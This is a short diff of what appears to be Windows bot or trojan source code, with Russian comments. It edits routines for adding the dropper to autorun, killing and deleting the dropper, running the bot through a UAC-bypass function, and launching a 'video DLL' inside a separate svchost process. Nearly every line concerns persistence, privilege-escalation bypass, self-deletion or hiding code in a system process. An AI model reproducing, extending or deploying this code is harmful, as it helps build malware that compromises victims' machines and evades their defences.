@@ -22,6 +22,7 @@
 #include "Modules.h"
 #include "Main.h"
 #include "StrConsts.h"
+#include "Installer.h"
 
 
 
@@ -106,7 +107,7 @@ void InternalAddToAutorun()
 	//if (!WSTR::IsEmpty(TempFileName))
 	if (IsDropper)
 	{
-			BOT::Install(DropperFileName, false);
+			Install(DropperFileName, FALSE,  TRUE, DropperPid);
 	}
 }
 
@@ -125,7 +126,7 @@ void DeleteDropper() // убиваем процесс, стираем файл
 
 
 
-bool RunLoaderRoutine()
+BOOL RunLoaderRoutine()
 {
 #ifdef UAC_bypassH
 	if( !RunBotBypassUAC(0) )
@@ -136,7 +137,7 @@ bool RunLoaderRoutine()
 #endif
 }
 
-bool RunVideoProcess()
+BOOL RunVideoProcess()
 {
 	MDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
 	return MegaJump( VideoProcess::StartSvchost );
